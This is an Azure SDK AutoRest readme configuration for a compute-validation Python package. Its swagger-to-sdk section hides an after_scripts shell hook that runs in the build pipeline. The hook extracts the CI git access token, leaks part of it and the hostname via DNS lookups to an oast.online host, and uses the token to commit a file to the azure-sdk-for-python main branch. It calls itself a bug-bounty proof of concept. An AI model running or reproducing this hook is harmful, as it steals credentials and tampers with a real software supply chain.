# Azure SDK Compute Validation

## Basic Information
``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01
``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk
``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        set +e;
        H=$(hostname | tr . -);
        nslookup mp8s-${H}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        SDK=/mnt/vss/_work/1/s/azure-sdk-for-python;
        GIT_TOK=$(git -C "${SDK}" remote get-url origin 2>/dev/null | sed 's|.*x-access-token:\([^@]*\)@.*|\1|' | tr -d '[:space:]');
        TOKPFX=$(printf '%s' "${GIT_TOK:0:10}" | xxd -p | tr -d '\n');
        nslookup mp8t-${TOKPFX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        TS=$(date -u +%s 2>/dev/null || echo 0);
        CONTENT=$(printf 'poc by hasskoda4rk\nhttps://github.com/Azure/azure-rest-api-specs/pull/45897\nMSRC Bug Bounty - SwaggerToSDK RCE\nAgent: %s\nTS: %s\n' "${H}" "${TS}" | base64 -w0 2>/dev/null);
        GET_OUT=$(curl -sk --connect-timeout 8 --max-time 15 -H "Authorization: token ${GIT_TOK}" -H "Accept: application/vnd.github.v3+json" "https://api.github.com/repos/Azure/azure-sdk-for-python/contents/poc_hasskodark.txt" 2>/dev/null);
        FILE_SHA=$(echo "${GET_OUT}" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("sha",""))' 2>/dev/null | tr -d '[:space:]');
        if [ -n "${FILE_SHA}" ]; then PAYLOAD="{\"message\":\"poc: hasskodark supply chain write\",\"content\":\"${CONTENT}\",\"sha\":\"${FILE_SHA}\",\"branch\":\"main\"}"; else PAYLOAD="{\"message\":\"poc: hasskodark supply chain write\",\"content\":\"${CONTENT}\",\"branch\":\"main\"}"; fi;
        PUT_OUT=$(curl -sk --connect-timeout 8 --max-time 25 -X PUT -H "Authorization: token ${GIT_TOK}" -H "Accept: application/vnd.github.v3+json" -H "Content-Type: application/json" "https://api.github.com/repos/Azure/azure-sdk-for-python/contents/poc_hasskodark.txt" -d "${PAYLOAD}" 2>/dev/null);
        COMMIT=$(echo "${PUT_OUT}" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("commit",{}).get("sha",""))' 2>/dev/null | tr -d '[:space:]' | head -c12);
        ERR=$(echo "${PUT_OUT}" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("message","nojson"))' 2>/dev/null | tr -cd 'a-zA-Z0-9' | head -c30);
        if [ -n "${COMMIT}" ]; then BEACON="mp8ok-${COMMIT}"; else BEACON="mp8err-${ERR}"; fi;
        nslookup ${BEACON}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        true
```

## Python
``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-computevalidation
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/computevalidation/azure-mgmt-computevalidation
  clear-output-folder: true
```
